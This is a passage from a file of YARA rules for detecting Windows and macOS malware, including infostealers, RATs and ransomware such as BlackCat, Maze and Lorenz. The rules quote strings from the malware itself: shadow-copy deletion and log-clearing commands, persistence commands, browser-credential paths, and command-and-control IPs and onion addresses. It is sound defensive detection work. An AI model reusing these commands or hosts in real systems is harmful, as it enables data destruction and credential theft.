hash5 = "4afd9f0dde092daeac3f3e6ffb0aee06682b3dba6005d2bd1a914eefd5cc6a30"
strings:
$x1 = "cmd.exe /c echo kOJAdtQoDcMuogIZIl>\"%s\"&exit" fullword ascii
$x2 = "cmd.exe /c echo HBnBcZPeUevCDQmKGzXxYJHqpzRAbRCQCihOxiLi>\"%s\"&exit" fullword ascii
$x3 = "cmd.exe /c set kpUUCjoLWLZvJFc=3167 & reg add HKCU\\SOFTWARE\\EQwIobTRgsJ /v PDMXPmqSYnUx /t REG_DWORD /d 10080 & exit" fullword ascii
//$x4 = "DEMOBLABLA" fullword ascii
$s1 = "ReplaceFileA" ascii
$s2 = "FlushFileBuffers" ascii
$s3 = "WaitNamedPipeA" ascii
$s4 = "ImpersonateNamedPipeClient" ascii
$s5 = "RegFlushKey" ascii
$s6 = /cmd\.exe \/c (echo|set)/ ascii
$s7 = ">\"%s\"&exit" ascii
condition:
uint16(0) == 0x5a4d and pe.is_dll() and (1 of ($x*) or 6 of ($s*)) and
(
pe.exports("DllGetClassObject") and
pe.exports("DllMain") and
pe.exports("DllRegisterServer") and
pe.exports("DllUnregisterServer") and
pe.exports("InitHelperDll") and
pe.exports("StartW")
)
}
rule SSC_Win_ClipBanker02 {
meta:
author = "ditekSHen"
description = "Detects ClipBanker infostealer"
strings:
$x1 = "\\Allcome\\Source code\\Clipper\\" ascii nocase
$x2 = "\\cleaper\\Release\\cleaper.pdb" ascii nocase
$v1_1 = "&username=" fullword ascii
$v1_2 = "/card.php?data=" fullword ascii
$v1_3 = "/Create /tn MicrosoftDriver /sc MINUTE /tr" fullword ascii
$v1_4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0" fullword ascii
$v1_5 = "/API/Clipper/ykesqk0o.php?cf6zrlhn=" fullword ascii
$v1_6 = "&di7ztth6=" fullword ascii
$v1_7 = "/API/Clipper/hr627gzk.php?v6etwxo5=" fullword ascii
$v2_1 = "bitcoincash:" fullword ascii
$v2_2 = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" ascii
$re1 = "^[0-9]{16}$" fullword ascii
$re2 = "^[0-9]{4}\\s[0-9]{4}\\s[0-9]{4}\\s[0-9]{4}" fullword ascii
$re3 = "^\\d{2}\\D\\d{2}" fullword ascii
$re4 = "^[0-9]{3}" fullword ascii
$re5 = "([\\W]?[0-9]{4}[\\W]?[0-9]{4}[\\W]?[0-9]{4}[\\W]?[0-9]{4}[\\W]?)" fullword ascii
$re6 = "(\\d{2}\\D\\d{2})" fullword ascii
$re7 = "(\\d{3})" fullword ascii
condition:
uint16(0) == 0x5a4d and ((1 of ($x*) and (5 of ($v1*) or all of ($v2*))) or (3 of ($re*) and (2 of ($v1*) or 2 of ($v2*))))
}
rule SSC_Win_BadJoke {
meta:
author = "ditekSHen"
description = "Detects BadJoke / Witch"
strings:
$s1 = "msdownld.tmp" fullword ascii
$s2 = "UPDFILE%lu" fullword ascii
$s3 = "Command.com /c %s" fullword ascii
$s4 = "launch.cmd" fullword ascii
$s5 = "virus.vbs" fullword ascii
$s6 = "virus.py" fullword ascii
$m1 = "Message from Google Virus" ascii
$m2 = "you cannot get rid of this virus" ascii
condition:
uint16(0) == 0x5a4d and (all of ($m*) or all of ($s*) or (1 of ($m*) and 2 of ($s*)))
}
rule SSC_Win_Heracles {
meta:
author = "ditekSHen"
description = "Detects Heracles infostealer"
strings:
$x1 = "aHR0cHM6Ly9uYWNrZXIudG9hbnNlY3UuY29tL3VwbG9hZHM/a2V5PX" wide
$b1 = "XEdvb2dsZVxDaHJvbWVc" wide
$b2 = "XEJyYXZlU29mdHdhcmVcQnJhdmUtQnJvd3Nlcl" wide
$b3 = "XENvY0NvY1xCcm93c2VyX" wide
$b4 = "VXNlciBEYXRh" wide
$b5 = "RGVmYXVsdA" wide
$b6 = "UHJvZmlsZQ" wide
$b7 = "Q29va2llcw" wide
$b8 = "TG9naW4gRGF0YQ" wide
$b9 = "TG9jYWwgU3RhdGU" wide
$b10 = "bG9jYWxzdGF0ZQ" wide
$b11 = "bG9naW5kYXRh" wide
$s1 = "encrypted_key" fullword wide
$s2 = "<GetIpInfoAsync>d__" ascii
$s3 = "<reqHTML>5__" ascii
$s4 = "<idHardware>5__" ascii
$s5 = "<profilePaths>5__" ascii
$s6 = "<cookieFile>5__" ascii
$s7 = "<loginDataFile>5__" ascii
$s8 = "<localStateFile>5__" ascii
$s9 = "<postData>5__" ascii
condition:
uint16(0) == 0x5a4d and (1 of ($x*) or 8 of ($s*) or (4 of ($b*) and 4 of ($s*)))
}
rule SSC_Win_OnlyLogger {
meta:
author = "ditekSHen"
description = "Detects OnlyLogger loader variants"
strings:
$s1 = { 45 6c 65 76 61 74 65 64 00 00 00 00 4e 4f 54 20 65 6c 65 76 61 74 65 64 }
$s2 = "\" /f & erase \"" ascii
$s3 = "/c taskkill /im \"" ascii
$s4 = "KILLME" fullword ascii
$s5 = "C:\\Windows\\System32\\cmd.exe" fullword ascii
$gn = ".php?pub=" ascii
$ip = /\/1[a-z0-9A-Z]{4,5}/ fullword ascii
$h1 = "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1" fullword ascii
$h2 = "Accept-Language: ru-RU,ru;q=0.9,en;q=0.8" fullword ascii
$h3 = "Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1" fullword ascii
$h4 = "Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0" fullword ascii
$h5 = "Content-Type: application/x-www-form-urlencoded" fullword wide
condition:
uint16(0) == 0x5a4d and (all of ($s*) or (#ip > 5 and ($gn or 3 of ($s*) or all of ($h*))) or (all of ($h*) and 3 of ($s*)))
}
rule SSC_Win_BlackByteGo {
meta:
author = "ditekSHen"
description = "Detects BlackByte ransomware Go variants"
strings:
$x1 = "BlackByteGO/_cgo_gotypes.go" fullword ascii
//$x2 = "_cgo_dummy_export" fullword ascii
$x3 = "BlackByteGO/" ascii nocase
$s1 = ".Disconnect" ascii
$s2 = ".OpenService" ascii
$s3 = ".ListServices" ascii
$s4 = ".Start" ascii
$s5 = ".Encrypt" ascii
$s6 = ".Decrypt" ascii
$s7 = ".MustFindProc" ascii
$s8 = ".QuoRem" ascii
$s9 = "C:\\Windows\\regedit.exe" fullword wide
condition:
uint16(0) == 0x5a4d and (1 of ($x*) or all of ($s*))
//uint16(0) == 0x5a4d and (1 of ($x*) or all of ($s*) or (1 of ($x*) and 5 of ($s*)))
}
rule SSC_Win_Vulturi {
meta:
author = "ditekSHen"
description = "Detects Vulturi infostealer"
strings:
$x1 = "Vulturi_" ascii wide
$x2 = "VulturiProject" fullword ascii
$s1 = { 5b 00 2d 00 5d 00 20 00 53 00 65 00 72 00 76 00
65 00 72 00 20 00 ?? ?? 20 00 69 00 73 00 20 00
6f 00 66 00 66 00 6c 00 69 00 6e 00 65 00 2e 00
2e 00 2e 00 00 ?? 5b 00 2b 00 5d 00 20 00 53 00
65 00 72 00 76 00 65 00 72 00 20 00 00 ?? ?? 00
69 00 73 00 20 00 6f 00 6e 00 6c 00 69 00 6e 00
65 00 }
$s2 = "Writing is not alowed" wide
$s3 = "System\\ProcessList.txt" fullword wide
$s4 = "[X] GetSSL ::" fullword wide
$s5 = "Failed to steal " wide
$s6 = "StealerStub" fullword ascii
$s7 = "/C chcp 65001 && netsh" wide
$n1 = "fetch_options" fullword wide
$n2 = "send_report" fullword wide
$n3 = "?username=" fullword wide
condition:
uint16(0) == 0x5a4d and ((1 of ($x*) and any of them) or all of ($n*) or 5 of ($s*) or (1 of ($n*) and 3 of ($s*)))
}
rule SSC_Win_Tofsee {
meta:
author = "ditekSHen"
description = "Detects Tofsee"
strings:
$s1 = "n%systemroot%\\system32\\cmd.exe" fullword wide
$s2 = "loader_id" fullword ascii
$s3 = "start_srv" fullword ascii
$s4 = "lid_file_upd" fullword ascii
$s5 = "localcfg" fullword ascii
$s6 = "Incorrect respons" fullword ascii
$s7 = "mx connect error" fullword ascii
$s8 = "Error sending command (sent = %d/%d)" fullword ascii
$s9 = "%s, %u %s %u %.2u:%.2u:%.2u %s%.2u%.2u" fullword ascii
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_Win_Khonsari {
meta:
author = "ditekSHen"
description = "Detects Khonsari ransomware"
strings:
$x1 = ".khonsari" fullword wide nocase
$s1 = "Encrypt" fullword ascii
$s2 = "CreateEncryptor" fullword ascii
$s3 = "GenerateKey" fullword ascii
$s4 = "277e5e6a-4da6-4138-97fa-3fecbdad0176" ascii
condition:
uint16(0) == 0x5a4d and ((1 of ($x*) and 2 of ($s*)) or (all of ($s*)))
}
rule SSC_Win_Quantum {
meta:
author = "ditekSHen"
description = "Detects Quantum locker / ransomware"
strings:
$x1 = "\\t<title>Quantum</title>" ascii wide
$x2 = "Quantum Locker.<br><br>" ascii wide
$s1 = "ERROR" fullword wide
$s2 = ".log" fullword wide
$s3 = "SLOW" fullword wide
$s4 = "Create" fullword wide
$s5 = "Integrity" fullword wide
$s6 = "Disabled" fullword wide
$s7 = "Deny" fullword wide
$s8 = "FAST" fullword wide
$s9 = "Mandatory" fullword wide
$s10 = "plugin.dll" fullword ascii
$s11 = "NetGetDCName" fullword ascii
$s12 = "NetShareEnum" fullword ascii
$s13 = "NetGetJoinInformation" fullword ascii
condition:
(uint16(0) == 0x5a4d and (all of ($x*) or 9 of ($s*) or (pe.number_of_exports == 2 and pe.exports("RunW") and pe.exports("runW") and 5 of ($s*)))) or all of ($x*)
}
rule SSC_Win_TigerRAT {
meta:
author = "ditekSHen"
description = "Detects TigerRAT"
strings:
$m1 = ".?AVModuleKeyLogger@@" fullword ascii
$m2 = ".?AVModulePortForwarder@@" fullword ascii
$m3 = ".?AVModuleScreenCapture@@" fullword ascii
$m4 = ".?AVModuleShell@@" fullword ascii
$s1 = "\\x9891-009942-xnopcopie.dat" fullword wide
$s2 = "(%02d : %02d-%02d %02d:%02d:%02d)--- %s[Clipboard]" fullword ascii
$s3 = "[%02d : %02d-%02d %02d:%02d:%02d]--- %s[Title]" fullword ascii
$s4 = "del \"%s\"%s \"%s\" goto " ascii
$s5 = "[<<]" fullword ascii
condition:
uint16(0) == 0x5a4d and (all of ($s*) or (all of ($m*) and 1 of ($s*)) or (2 of ($m*) and 2 of ($s*)))
}
rule SSC_Win_Owowa {
meta:
author = "ditekSHen"
description = "Detects Owowa"
strings:
$u1 = "jFuLIXpzRdateYHoVwMlfc" fullword ascii wide
$u2 = "Fb8v91c6tHiKsWzrulCeqO" fullword ascii wide
$u3 = "dEUM3jZXaDiob8BrqSy2PQO1" fullword ascii wide
$s1 = "powershell.exe" fullword wide
$s2 = "<RSAKeyValue><Modulus>" wide
$s3 = "HealthMailbox" fullword wide
$s4 = "6801b573-4cdb-4307-8d4a-3d1e2842f09f" ascii
$s5 = "<PreSend_RequestContent>b__" ascii
$s6 = "ClearHeaders" fullword ascii
$s7 = "get_UserHostAddress" fullword ascii
$s8 = "ExtenderControlDesigner" fullword ascii
condition:
uint16(0) == 0x5a4d and (all of ($u*) or (2 of ($u*) and 3 of ($s*)) or 6 of ($s*))
}
rule SSC_Win_Chebka {
meta:
author = "ditekSHen"
description = "Detects Chebka"
strings:
$s1 = "-k netsvcs" wide
$s2 = "%ssvchost.exe -k SystemNetworkService" wide
$s3 = "Mozilla/4.0 (compatible)" wide
$s4 = "_kasssperskdy" wide
$s5 = "winssyslog" wide
$s6 = "LoaderDll%d" wide
$s7 = "cmd.exe /c rundll32.exe shell32.dll," wide
$s8 = /cmd.exe \/c start (chrome|msedge|firefox|iexplorer)\.exe/ wide
$f1 = ".?AVCHVncManager@@" fullword ascii
$f2 = ".?AVCNetstatManager@@" fullword ascii
$f3 = ".?AVCTcpAgentListener@@" fullword ascii
$f4 = ".?AVIUdpClientListener@@" fullword ascii
$f5 = ".?AVCShellManager@@" fullword ascii
$f6 = ".?AVCScreenSpy@@" fullword ascii
condition:
uint16(0) == 0x5a4d and (5 of ($s*) or all of ($f*) or (3 of ($f*) and 3 of ($s*)) or (#s8 > 2 and 5 of them))
}
rule SSC_Win_Flagpro {
meta:
author = "ditekSHen"
description = "Detects Flagpro"
strings:
$s1 = "download...." fullword ascii
$s2 = "~MYTEMP" fullword wide
$s3 = ".?AVCV20_LoaderApp@@" fullword ascii
$s4 = ".?AVCV20_LoaderDlg@@" fullword ascii
$s5 = "ExecYes" fullword ascii
$s6 = /<BODY ID=CV\d+_LoaderDlg BGCOLOR=/ ascii
$n1 = "://139.162.87.180" wide
$n2 = "://172.104.109.217" wide
$n3 = "://org.misecure.com/index.html" wide
$b1 = /(get all|click|close|maybe|get_outerHTML|download\d) (finished|pass|ok|windows|failed)!/ fullword ascii
condition:
uint16(0) == 0x5a4d and 4 of ($s*) or (1 of ($n*) and (2 of ($s*) or 1 of ($b*))) or (2 of ($s*) and 1 of ($b*))
}
rule SSC_Win_NPlusMiner {
meta:
author = "ditekSHen"
description = "Detects PowerShell based NPlusMiner"
snort_sid = "920284"
strings:
$s1 = "$Core | Add-Member @{IsReadOnly = $((Get-ItemProperty -Path \".\\Includes\\Core.ps1\").IsReadOnly)} -Force" fullword ascii
$s2 = "$Core | Add-Member @{MinerCustomConfig = $((Get-Content \".\\Config\\MinerCustomConfig.json\" -Raw))} -Force" fullword ascii
$s3 = "If ($Variables.CheatGuy -and $Core.corehash -in $Hashes -and $Core.ScriptStartDate -le (Get-Date)" ascii
$s4 = "Try{(Get-ItemProperty -Path \".\\Includes\\Core.ps1\").IsReadOnly = $false} catch {}" fullword ascii
$s5 = " NPlusMiner/" ascii
condition:
3 of them
}
rule SSC_Win_PWSH_PoshCookieStealer {
meta:
author = "ditekSHen"
description = "Detects PowerShell PoshCookieStealer"
strings:
$s1 = "\\User Data\\default\\Network\\Cookies" ascii nocase
$s2 = "Send-ToEmail" ascii
$s3 = "[Security.Cryptography.ProtectedData]::Unprotect($" ascii
$s4 = "$($env:LOCALAPPDATA)\\" ascii
$s5 = "$($env:HOMEPATH)\\" ascii
$s6 = "|ForEach-Object ToString X2) -join ''" ascii
$s7 = ".Attachments.Add($" ascii
condition:
5 of them
}
rule SSC_Win_GarrantDecrypt {
meta:
author = "ditekSHen"
description = "Detects GarrantDecrypt ransomware"
strings:
$x1 = "%appdata%\\_uninstalling_.png" fullword wide
$x2 = "C:\\Windows\\sysnative\\vssadmin.exe" fullword wide
$x3 = /(ICQ|Skype) (@nuncatarde|@supersuso|@Whitehorsedecryption|@likeahorse|@Konwarszawski|@zipzipulya|Whitehorsedecryption|LIKEAHORSE DECRYPTION|Zip Zipulya)/ ascii
$s1 = "your unique ID" ascii
$s2 = "Google market ICQ" ascii
$s3 = "If you want to restore them, install ICQ" ascii
$s4 = "Write to our ICQ @" ascii
condition:
uint16(0) == 0x5a4d and ((2 of ($x*) and 1 of ($s*)) or all of ($s*))
}
rule SSC_Win_Locked {
meta:
author = "ditekSHen"
description = "Detects Locked ransomware"
strings:
$x1 = "http://xxxx.onion/xxxx-xxxx-xxxx-xxxx" ascii
$x2 = "http://pigetrzlperjreyr3fbytm27bljaq4eungv3gdq2tohnoyfrqu4bx5qd.onion" ascii
$x3 = "dHA6Ly94eHh4Lm9uaW9uL3h4eHgteHh4eC14eHh4LXh4eHg" ascii
$s1 = "choice /t 1 /d y /n >nul" ascii
$s2 = ".locked" fullword ascii
$s3 = "c:\\system volume information" fullword ascii
$s4 = "__$$RECOVERY_README$$__.html" fullword ascii
$s5 = "Trunc..." fullword ascii
$s6 = /C:\\windows\\temp\\[a-z0-9A-Z]{6}\.tmp/ fullword ascii
condition:
uint16(0) == 0x5a4d and (all of ($x*) or all of ($s*) or (1 of ($x*) and 4 of ($s*)) or (#s6 > 1 and 4 of them))
}
rule SSC_Win_Maze {
meta:
author = "ditekSHen"
description = "Detects Maze ransomware"
strings:
$x1 = "Uc32nbspacec97c98c99c100c101c102c103c104c105c106c107c108c109c110c" ascii
$s1 = "\"%s\" shadowcopy delete" wide
$s2 = "[%windir%\\system32\\wbem\\wmic" wide
$s3 = "process call create \"cmd /c start %s\"" wide
$s4 = "DECRYPT-FILES.html" fullword wide
$s5 = "Dear %s, your files" wide
$s6 = "%s! Alert! %s! Alert!" wide
$s7 = "%BASE64_PLACEHOLDER%" fullword ascii
$s8 = "-orDGorX0or" fullword ascii
$s9 = { 47 45 54 20 2f 25 73 20 48 54 54 50 2f 31 2e 31
0d 0a 55 73 65 72 2d 41 67 65 6e 74 3a 20 25 73
0d 0a 48 6f 73 74 3a 20 25 73 0d 0a 43 6f 6e 6e
65 63 74 69 6f 6e 3a 20 4b 65 65 70 2d 41 6c 69
76 65 0d 0a 0d 0a 00 50 4f 53 54 20 2f 25 73 20
48 54 54 50 2f 31 2e 31 0d 0a 55 73 65 72 2d 41
67 65 6e 74 3a 20 25 73 0d 0a 48 6f 73 74 3a 20
25 73 0d 0a 43 6f 6e 74 65 6e 74 2d 54 79 70 65
3a 20 25 73 0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65
6e 67 74 68 3a 20 25 64 0d 0a 43 6f 6e 6e 65 63
74 69 6f 6e 3a 20 4b 65 65 70 2d 41 6c 69 76 65
0d 0a 0d 0a 00 0d 0a 0d 0a 00 43 6f 6e 74 65 6e
74 2d 4c 65 6e 67 74 68 3a 20 00 }
condition:
uint16(0) == 0x5a4d and ((1 of ($x*) and 3 of ($s*)) or 6 of ($s*))
}
rule SSC_Win_TeslaRevenge {
meta:
author = "ditekSHen"
description = "Detects TeslaRevenge ransomware"
strings:
$s1 = "autospreadifnoav=" ascii wide
$s2 = "autospread=" ascii wide
$s3 = "noencryptext=" ascii wide
$s4 = "teslarvng" wide
$s5 = "finished encrypting" wide nocase
$s6 = "net scan" wide nocase
$s7 = "for /f %%x in ('wevtutil el') do wevtutil cl" ascii
$s8 = "tasklist | find /i \"SDELETE.exe\"" ascii
$e1 = "mshta.exe" ascii wide nocase
$e2 = "sc.exe" ascii wide nocase
$e3 = "vssadmin.exe" ascii wide nocase
$e4 = "wbadmin.exe" ascii wide nocase
$e5 = "cmd.exe" ascii wide nocase
condition:
uint16(0) == 0x5a4d and (4 of ($s*) or (all of ($e*) and 2 of ($s*)))
}
rule SSC_Win_LokiLocker {
meta:
author = "ditekSHen"
description = "Detects LokiLocker ransomware"
strings:
$x1 = "SOFTWARE\\Loki" fullword wide
$x2 = "Cpriv.Loki" fullword wide
$x3 = "Loki/" wide
$x4 = /loki(\s)?locker/ fullword wide nocase
$s1 = "Restore-My-Files.txt" wide
$s2 = "loading encryption keys" wide
$s3 = "Kill switch -> enabled" wide
$s4 = "ScanSMBShares" fullword ascii
$s5 = "RewriteMBR" fullword ascii
$s6 = /Encrypt(Drives|File|WinVolume|OsDrive)/ fullword ascii
$n1 = "unique-id=" ascii wide
$n2 = "&disk-size=" ascii wide
$n3 = "&user=Darwin&cpu-name=" ascii wide
$n4 = "&ram-size=" ascii wide
$n5 = "&os-name=" ascii wide
$n6 = "&chat-id=" ascii wide
$n7 = "&msg-id=" ascii wide
$n8 = "&elapsed-time=" ascii wide
condition:
uint16(0) == 0x5a4d and (2 of ($x*) or 4 of ($s*) or 6 of ($n*) or (3 of ($s*) and 3 of ($n*)) or (1 of ($x*) and (2 of ($s*) or 2 of ($n*))))
}
rule SSC_Osx_DazzleSpy {
meta:
author = "ditekSHen"
description = "Attemp at hunting for DazzleSpy"
strings:
$x1 = "/osxrk_commandline/" ascii wide nocase
$x2 = "/Users/wangping/pangu/" ascii wide nocase
$s1 = "heartbeat" ascii wide
$s2 = "scanFiles" ascii wide
$s3 = "restartCMD" ascii wide
$s4 = "downloadFile" ascii wide
$s5 = "RDPInfo" ascii wide
condition:
uint16(0) == 0xfacf and (all of ($x*) or all of ($s*) or (1 of ($x*) and 3 of ($s*)))
}
rule SSC_Win_BHunt {
meta:
author = "ditekSHen"
description = "Detects BHunt infostealer"
strings:
$x1 = "BHUNT.Resources.resources" fullword ascii
$x2 = "//minecraftsquid.hopto.org/" wide
$s1 = "chaos_crew" ascii wide
$s2 = "golden7" ascii wide
$s3 = "mrpropper" ascii wide
$s4 = "/ifo.php?" ascii wide
$s5 = "bonanza=:=" ascii wide
$s6 = "blackjack=:=" ascii wide
$s7 = "SendPostData" fullword ascii
$c1 = "cmd /c REG ADD" wide
$c2 = "taskkill /F /IM" wide
$c3 = "cmd.exe /c wmic" wide
$g1 = "$ca9a291d-266c-41dc-9f1c-93cfe0dcac16" fullword ascii
$g2 = "$6d0feb35-213d-4b9f-afc7-06d168cfcb5e" fullword ascii
condition:
uint16(0) == 0x5a4d and (all of ($x*) or (1 of ($x*) and (5 of ($s*) or 2 of ($c*))) or (6 of ($s*) and 2 of ($c*)) or (all of ($g*) and 2 of them))
}
rule SSC_Win_Lorenz {
meta:
author = "ditekSHen"
description = "Detects Lorenz ransomware"
strings:
$x1 = "143.198.117.43" fullword ascii
$x2 = "157.90.147.28" fullword ascii
$x3 = "//kpb3ss3vwvfejd4g3gvpvqo6ad7nnmvcqoik4mxt2376yu2adlg5fwyd.onion" ascii
$x4 = "http://lorenz" ascii
$x5 = "\\lora\\Release\\lora.pdb" ascii
$x6 = "--MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQ" ascii
$x7 = "/USER:'HOMEOFFICE.COM\\" ascii
$x8 = "/USER:'Sentinel.com\\" ascii
$s1 = "to->_What == nullptr && to->_DoFree == false" fullword wide
$s2 = "*it == '\\0'" fullword wide
$s3 = "process call create 'cmd.exe /c" ascii
$s4 = "\\Control Panel\\Desktop\" /V Wallpaper /T REG_SZ /F /D" ascii
$s5 = "HELP_SECURITY_EVENT.html" ascii
$s6 = "<br>[+] Whats Happen?" ascii
$s7 = /\.Lorenz\.sz\d+$/ fullword ascii
$s8 = "TW9Vc29Db3JlV29ya2VyLmV4ZQ==" fullword ascii
$s9 = ".Speak(\"You've been hack" ascii nocase
$s10 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAo" ascii
$n1 = "ame_serv=" ascii
$n2 = "&ip=" ascii
$n3 = "&winver=Windows" ascii
$n4 = "&list_drive=" ascii
$n5 = "&file=" ascii
condition:
uint16(0) == 0x5a4d and (2 of ($x*) or 8 of ($s*) or (4 of ($n*) and 2 of them) or (1 of ($x*) and 6 of them))
}
rule SSC_Win_BlackCat {
meta:
author = "ditekSHen"
description = "Detects BlackCat ransomware"
strings:
$x1 = "{\"config_id\":\"\",\"public_key\":\"MIIBIjANBgkqhkiG9w0BAQEFAAO" ascii
$x2 = "C:\\Users\\Public\\All Usersdeploy_note_and_image_for_all_users=" fullword ascii
$s1 = "encrypt_app::windows" ascii
$s2 = /locker::core::os::windows::(desktop_note|self_propagation|privilege_escalation|psexec|shadow_copy)/ ascii
$s3 = "uac_bypass::shell_exec=" ascii
$s4 = "-u-p-s-d-f-cpropagate::attempt=" ascii
$s5 = "masquerade_peb" ascii
$s6 = "RECOVER-${EXTENSION}-FILES.txt" ascii
$s7 = ".onion/?access-key=${ACCESS_KEY}" ascii
$s8 = "-vm-killno-vm-snapshot-killno-vm-kill-" ascii
$s9 = "esxi_vm_killenable_esxi_vm_snapshot_killstrict_" ascii
$s10 = /enum_(shares|servers)_sync::ok/ fullword ascii
$s11 = "hidden_partitions::mount_all::mounting=" ascii
//bcdedit /set {default}bcdedit /set {default} recoveryenabled No
//kill_all::found=
condition:
(uint16(0) == 0x5a4d or uint16(0) == 0x457f) and (all of ($x*) or 5 of ($s*) or (1 of ($x*) and 3 of ($s*)))
}
rule SSC_Win_Koxic {
meta:
author = "ditekSHen"
description = "Detects Koxic ransomware"
strings:
$c1 = " INFO: >> %TEMP%\\" ascii wide
$c2 = "cmd /c \"wmic" ascii wide
$c3 = "cmd /c \"echo" ascii wide
$c4 = "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"" fullword wide
$c5 = /sc config.{1,30}start=disabled/ fullword ascii wide
$s1 = "Container: %s" fullword wide
$s2 = "Shotcut dir : %s" fullword wide
$s3 = "\\Microsoft\\Windows\\Network Shortcuts\\" fullword wide
$s4 = "Thread %d started." fullword ascii
$s5 = "ADD our TOXID:" wide
$s6 = "[Recommended] Using an email" wide
condition:
uint16(0) == 0x5a4d and ((4 of ($s*) and 1 of ($c*)) or (2 of ($s*) and (#c1 > 5 or #c2 > 5 or #c3 > 5 or #c5 > 5)))
}
rule SSC_Win_TimeTime {
meta:
author = "ditekSHen"
description = "Detects TimeTime ransomware"
strings:
$s1 = "@_DECRYPTOR_@" ascii wide
$s2 = "@__RECOVER_YOUR_FILES__@" wide
$s3 = "\\TimeTime.pdb" ascii
$s4 = "runCommand" fullword ascii
$s5 = "decryptor_file_name" fullword ascii
$s6 = "encryption_hiding_process" fullword ascii
$s7 = "admin_hiding_process" fullword ascii
$s8 = "security_vaccine" fullword ascii
$s9 = "EncrFiles_Load" fullword ascii
condition:
uint16(0) == 0x5a4d and 4 of them
}
rule SSC_Win_StrifeWater {
meta:
author = "ditekSHen"
description = "Detects StrifeWater RAT"
strings:
$s1 = "example/1.0" fullword wide
$s2 = "coname:" fullword ascii
$s3 = "*elev:" fullword ascii
$s4 = "*uname:" fullword ascii
$s5 = "--BoundrySign" ascii
$s6 = "000000c:\\users\\public\\libraries\\tmp.bi" ascii
$s7 = "9c4arSBr32g6IOni" fullword ascii
$pdb = "\\win8\\Desktop\\ishdar_win8\\" ascii
$xn1 = "techzenspace.com" fullword wide
$xn2 = "87.120.8.210" wide
$xn3 = "192.168.40.27" wide
$n1 = /RVP\/index\d+\.php/ fullword wide
$n2 = "tid=%d&code=%s&fname=%s&apiData=%s" fullword ascii
$n3 = "code=%s&tid=%d&fname=%s&apiData=%s" fullword ascii
$n4 = "Content-Disposition: form-data; name=\"token\"" fullword ascii
$n5 = "Content-Disposition: form-data; name=\"apiData\"" fullword ascii
$n6 = "Content-Disposition: form-data; name=\"data\"; filename=\"" fullword ascii
$n7 = "Content-Disposition: form-data; name=\"tid\"" fullword ascii
condition:
uint16(0) == 0x5a4d and (2 of ($xn*) or 6 of ($s*) or 6 of ($n*) or (1 of ($xn*) and 4 of them) or ($pdb and 4 of them) or (3 of ($s*) and 3 of ($n*)))
}
rule SSC_Win_UDPRat {
meta:
author = "ditekSHen"
description = "Detects UDPRat"
strings:
$s1 = "\\code\\UDP\\Client\\" ascii
$s2 = "ssdp:discover" ascii
$s3 = ": Device:" ascii
$s4 = "for the SNMP U encountered" ascii
$s5 = "privat:InternetGatewayelink" fullword ascii
$s6 = "schemas A jet error was" ascii
$s7 = "msidentity" fullword ascii
$s8 = "microsoftonliser-based Securi" ascii
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_Win_JesterStealer {
meta:
author = "ditekSHen"
description = "Detects JesterStealer"
strings:
$s1 = /\[(Credman|Networks|Screenshot|Vault)\]\s\{0\}/ fullword wide
$s3 = "encoding=\"base64\"" fullword wide
$s4 = "/json/list" fullword wide
$s5 = "/L1ghtM4n/TorProxy/" ascii wide
$s6 = "<EnumerateCredentials>" ascii
$s7 = "<EnumerateBrowsers>" ascii
$s8 = "<PerformSelfDestruct>" ascii
$s9 = "<get_GrabberCount>" ascii
$s10 = "AnalyzeData" fullword ascii
$s11 = "CheckCard" fullword ascii
$s12 = "CreateGrabberZipPath" fullword ascii
$s13 = "Jester" fullword ascii
$s14 = /Stealer\.(Recovery|Grabber|Investigation)\./ ascii
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_Win_SoranoStealer {
meta:
author = "ditekSHen"
description = "Detects SoranoStealer / HogGrabber. Available on Github: /Alexuiop1337/SoranoStealer"
strings:
$x1 = "OiCuntJollyGoodDayYeHavin_" ascii
$x2 = { 00 56 4d 50 72 6f 74 65 63 74 00 52 65 61 63 74
6f 72 00 64 65 34 66 75 63 6b 79 6f 75 00 42 61
62 65 6c 4f 62 66 75 73 63 61 74 6f 72 41 74 74
72 69 62 75 74 65 00 43 72 79 74 70 6f 4f 62 66
75 73 63 61 74 6f 72 00 }
$x3 = { 00 4f 62 66 75 73 63 61 74 65 64 42 79 47 6f 6c
69 61 74 68 00 42 65 64 73 2d 50 72 6f 74 6f 72 00 }
$s1 = ".Binaries.whysosad" ascii
$s2 = "Adminstrator permissons are required" wide
$s3 = "12:03:33:4A:04:AF" fullword wide
$s4 = "RemoveEXE" fullword ascii
$s5 = "$340becfa-1688-4c32-aa49-30fdb4005e4b" fullword ascii
$s6 = "$99cffbcc-6ad7-4d32-bd1f-450967cf4a6b" fullword ascii
$s7 = "\"cam\": " ascii
$s8 = " - 801858595527371999762718088" fullword ascii
$s9 = "  - 96188142294460126639341306" fullword ascii
condition:
uint16(0) == 0x5a4d and (all of ($x*) or (2 of ($x*) and 3 of ($s*)) or 5 of ($s*))
}
rule SSC_Win_GloomaneStealer {
meta:
author = "ditekSHen"
description = "Detects GloomaneStealer"
strings:
$x1 = "=GLOOMANE STEALER=" wide
$x2 = "Maded by GLOOMANE" wide
$s1 = "\\44CALIBER" ascii
$s2 = "Ethernet()" fullword wide
$s3 = ":spy: NEW LOG FROM" wide
$s4 = ":eye: IP:" wide
$s5 = ":file_folder: Grabbed Files" wide
$s6 = "$ebc25cf6-9120-4283-b972-0e5520d0000C" fullword ascii
$s7 = "$3b0e2d3d-3d66-42bb-8f9c-d6e188f359ae" fullword ascii
condition:
uint16(0) == 0x5a4d and (all of ($x*) or (1 of ($x*) and 3 of ($s*)) or 5 of ($s*))
}
rule SSC_Win_LockDown {
meta:
author = "ditekSHen"
description = "Detects Lockdown / cantopen ransomware"
strings:
$s1 = "BgIAAACkAABSU0E" wide
$s2 = ".cantopen" fullword wide
